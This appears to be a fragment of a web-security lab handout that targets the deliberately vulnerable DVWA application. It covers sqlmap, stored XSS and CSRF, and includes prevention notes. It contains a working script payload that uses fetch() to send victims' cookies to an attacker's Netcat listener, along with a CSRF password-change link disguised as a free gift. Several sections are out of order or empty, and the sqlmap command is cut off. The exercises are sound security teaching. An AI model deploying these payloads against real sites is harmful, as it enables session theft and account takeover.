📌 Expected Outcome:

🔹 Task 2: Automate SQL Injection with SQLmap (15 pts)

Goal

📌 Now, let's use SQLmap to automate the attack.
📌 SQLmap is a powerful tool that can:
✅ Detect SQL Injection vulnerabilities.
✅ Dump database contents.
✅ Find administrator credentials.
✅ Execute system commands (if possible).

🔹 Step 1: Retrieve the PHPSESSID from Browser Cookies

📌 Before running SQLMap, you need to extract your PHPSESSID to authenticate the request.

1️⃣ Open DVWA in Your Browser:

http://<M2-IP>/dvwa

2️⃣ Log in Using Default Credentials:

  • Username: admin
  • Password: password

3️⃣ Open Developer Tools (F12)

  • On Chrome or Edge: Press F12 or Ctrl + Shift + I.
  • On Firefox: Press F12 or Ctrl + Shift + I.
  • Go to the Application tab (Chrome/Edge) or Storage tab (Firefox).

4️⃣ Navigate to Cookies:

  • Expand Storage (Firefox) / Application (Chrome).
  • Click on Cookies → Select http://<M2-IP> (your DVWA site).

5️⃣ Find the PHPSESSID Cookie:

  • Look for the PHPSESSID value in the list.

🔹 Step 2: Use SQLMap with the Correct Session ID

📌 Now, run SQLMap with the retrieved PHPSESSID:

sqlmap -u "http://<M2-IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \

🔹 Explanation:

  • --cookie="security=low; PHPSESSID=<SESSION-ID>" → Ensures authentication works.
  • --dbs → Fetches available databases on the server.

📌 Expected Outcome:

🔹 Explanation:

Step 3: Modify the Attack to Steal Cookies to Netcat

Instead of an alert, modify the script to send session cookies to your attacker's Netcat listener on port 80:
On your Kali Linux, start a Netcat listener to capture the incoming cookies:

nc -lvnp 80

When a user triggers the XSS payload, their session cookie will be displayed in your Netcat terminal.

<script>fetch('http://<Kali-IP>/?cookie=' + document.cookie);</script>

📌 Replace <Kali-IP> with your Kali Linux IP address.
To send the stolen cookies to your attacker's Netcat (NC) listener on port 80, modify the payload as follows:

  • Netcat (NC) is listening on port 80, so we send the cookies as a GET request to that port.
  • fetch() is used instead of document.location, as Netcat doesn't serve a webpage.
  • The cookie will be captured in Netcat when a user visits the malicious link.

🔹 Task 3: Advanced Stored XSS: Multi-Step Cookie Theft (10 pts)

📌 If there is a character limit, we can split the payload across multiple stored messages.

✅ Educational Notes: Best Practices to Prevent XSS

1️⃣ Input Validation

  • Sanitize all user inputs to remove malicious code.
  • Use allowlists to restrict accepted characters.

2️⃣ Output Encoding

  • Convert special characters to safe HTML entities:
    < → &lt;
> → &gt;
" → &quot;
' → &#x27;
  • Use HTML escaping functions:
    • PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
    • Python (Django): escape(input)

3️⃣ Content Security Policy (CSP)

  • Prevents inline scripts from executing.
  • Example CSP header:
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;

4️⃣ Use HttpOnly Cookies

  • Prevents JavaScript from accessing session cookies:
    Set-Cookie: sessionid=xyz123; HttpOnly; Secure

🔹 Task 1: Perform a Basic CSRF Attack Using a Simple Link (15 pts)

📌 CSRF occurs when an attacker tricks a logged-in user into unknowingly submitting a malicious request to a web application.

🔹 Step 1: Open the CSRF Page

1️⃣ In DVWA, navigate to:

CSRF

2️⃣ You will see a form to change the user’s password.

🔹 Step 2: Understand the Password Change Request

📌 Use Developer Tools to analyze the structure of the GET request used for password changes.

1️⃣ Open Developer Tools (F12) in your browser.
2️⃣ Go to the Network tab and start monitoring requests.
3️⃣ Change the password to password123 and click "Change".
4️⃣ Look at the GET request sent to the server.

📌 Expected request format:

GET /dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change HTTP/1.1
Host: <M2-IP>
Cookie: PHPSESSID=<session-id>; security=low

🔹 Because this request uses GET instead of POST, it is vulnerable to CSRF.

🔹 Step 3: Craft a CSRF Exploit Using a Simple Link

📌 An attacker can send the victim a link that looks harmless but changes their password.

<a href="http://<M2-IP>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
Click Here for a Free Gift!
</a>

How It Works:

  • The victim thinks they are clicking a normal link but actually executes the CSRF attack.
  • If they are already logged into DVWA, their password changes to "hacked" without their knowledge.

🔹 Step 4: Test the Attack

1️⃣ Host the malicious link on Kali VM to simulate an attacker.

📌 Create a new HTML file (csrf_attack.html) on Kali:

nano csrf_attack.html

📌 Paste the following code inside the file:

<html>
  <body>
    <h1>Click Here for a Free Gift!</h1>
    <a href="http://<M2-IP>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
      Click Here to Claim Your Prize!
    </a>
  </body>
</html>

📌 Save the file and exit (CTRL + X → Y → ENTER).

2️⃣ Host the page using Python’s built-in HTTP server:

sudo python3 -m http.server 8080

📌 Now, the exploit page is available at:

http://<Kali-IP>:8080/csrf_attack.html

3️⃣ On Attack Kali VM, open an incognito/private browser window (emulating a victim).
4️⃣ Log into DVWA as admin.
5️⃣ Visit http://<Kali-IP>:8080/csrf_attack.html and click the link.

📌 Educational Note

Incognito mode is being used to represent a separate victim browser session that is not sharing cookies, cache, or login state with your normal browser window. Concretely, it models:

  • A different user (or the same user in a fresh session) who is already logged in to DVWA.
  • An independent set of cookies, including a different PHPSESSID, so you can clearly show that the cookie you capture via XSS belongs to the “victim session,” not your attacker session.
  • If you test stored XSS in the same browser session you used to inject the payload, you will steal your own cookie, which does not count as an account compromise!

✅ Educational Notes: Preventing CSRF Attacks

🔹 How should developers prevent CSRF attacks?

1️⃣ Use CSRF Tokens

  • Each sensitive request should require a unique, unpredictable CSRF token.
  • Example CSRF token implementation in HTML:
    <input type="hidden" name="csrf_token" value="e9d1a6f5b2c0">

2️⃣ Do Not Use GET Requests for Sensitive Actions

  • Password changes should always use a POST request, not GET.

3️⃣ SameSite Cookies

  • Set cookies with the SameSite flag to prevent cross-origin requests:
    Set-Cookie: PHPSESSID=xyz123; HttpOnly; Secure; SameSite=Strict

4️⃣ Referer Header Validation

  • Only allow requests from trusted origins by checking the Referer header.

5️⃣ User Authentication for Sensitive Actions

  • Require password confirmation before executing critical actions.
